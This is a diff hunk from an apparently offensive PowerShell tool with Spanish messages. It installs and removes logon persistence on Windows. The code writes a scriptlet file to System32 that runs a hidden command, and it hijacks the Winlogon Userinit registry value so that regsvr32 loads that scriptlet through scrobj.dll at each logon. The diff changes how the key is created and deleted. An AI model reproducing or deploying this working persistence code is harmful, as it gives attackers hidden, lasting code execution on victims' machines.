@@ -213,7 +213,7 @@ command = "' + $code + '"
 objShell.Run command,0
 Set objShell = Nothing'
 $plantilla_sct | Out-File -Encoding ascii "C:\Windows\System32\update.sct" 
-$key = "registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit"; $modifica = "c:\windows\system32\regsvr32.exe /s /n /u /i:c:\windows\system32\update.sct scrobj.dll" ; set-item $Key $modifica
+$key = "registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit"; New-Item $key ; $modifica = "c:\windows\system32\regsvr32.exe /s /n /u /i:c:\windows\system32\update.sct scrobj.dll" ; set-item $Key $modifica
 #$key = "registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"; $modifica = "c:\windows\system32\regsvr32.exe /s /n /u /i:c:\windows\system32\update.sct scrobj.dll" ; set-item $Key $modifica
 $texto = "Persistencia ejecutada correctamente"} return $texto;break}
 
@@ -227,7 +227,7 @@ $key = "registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersio
 #$key = "registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce";$check = Get-ItemProperty $key  | Select-String "regsvr32.exe" ; 
 if ($check.count -eq 0) {$texto = "Todo correcto! parece estar limpio el arranque"; return $texto; break} else {
 $texto = "Eliminando persistencia"
-$modifica = "" ; set-item $Key $modifica
+$modifica = "" ; set-item $Key $modifica ; Remove-Item $key
 Remove-Item C:\Windows\System32\update.sct; return $texto; break
 }}}
 
